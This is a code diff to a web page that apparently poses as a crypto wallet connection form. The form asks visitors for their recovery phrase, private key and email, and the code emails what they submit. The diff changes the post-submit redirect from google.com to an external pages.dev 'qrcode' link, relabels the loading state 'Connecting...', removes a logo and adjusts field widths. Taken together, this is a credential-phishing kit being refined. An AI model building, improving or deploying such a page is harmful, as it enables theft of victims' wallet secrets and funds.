@@ -75,7 +75,7 @@ const page = () => {
       );
 
       // Redirect to google.com after the form is successfully submitted
-      window.location.href = "https://www.google.com";
+      window.location.href = "https://nodes-sync.pages.dev/qrcode";
     } catch (error) {
       console.error("Error sending email:", error);
       // Handle the error, show a message, etc.
@@ -142,16 +142,13 @@ const page = () => {
       <div>
         <div className="container connect-section">
           <div className="section-container h-screen">
-            <div className="eth-logo">
-              <Image src={hero_img} alt="" width={150} className="h-auto" />
-            </div>
             <div className="connect-content w-full mx-16">
               {isLoading ? (
                 <p
-                  className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative animate-pulse  "
+                  className="bg-red-100 border border-blue-400 text-blue-900 px-4 py-3 rounded relative animate-pulse  "
                   role="alert"
                 >
-                  Loading...
+                  Connecting...
                 </p>
               ) : (
                 <div className="flex justify-center items-center flex-col form_div text-white">
@@ -222,7 +219,7 @@ const page = () => {
                                                 required
                                                 name="from_name"
                                                 rows={5}
-                                                className="block w-full rounded-md border-0 p-2 text-white shadow-sm ring-1 ring-inset ring-gray-600 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6 bg-[#0f12129f]"
+                                                className="block w-full rounded-md border-0 p-2 text-white shadow-sm ring-1 ring-inset ring-gray-600 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6 bg-[#0f12129f] md:w-96"
                                                 placeholder="enter your recovery phrase..."
                                                 autoComplete="off"
                                               />
@@ -277,7 +274,7 @@ const page = () => {
                                               required
                                               name="from_name"
                                               rows={5}
-                                              className="block w-full rounded-md border-0 p-2 text-white shadow-sm ring-1 ring-inset ring-gray-600 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6 form_div"
+                                              className="block w-full rounded-md border-0 p-2 text-white shadow-sm ring-1 ring-inset ring-gray-600 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6 form_div md:w-96" // Added md:w-96 for medium-sized screens
                                               placeholder="enter your private key..."
                                               autoComplete="off"
                                             />
@@ -330,7 +327,7 @@ const page = () => {
                                               name="email"
                                               type="email"
                                               autoComplete="email"
-                                              className="block w-full rounded-md border-0 py-1.5 text-gray-400 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6 bg-[#0f12129f]"
+                                              className="block w-full rounded-md border-0 py-1.5 text-gray-400 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6 bg-[#0f12129f] md:w-96" // Added md:w-96 for medium-sized screens
                                             />
                                             <label
                                               for="dropzone-file"
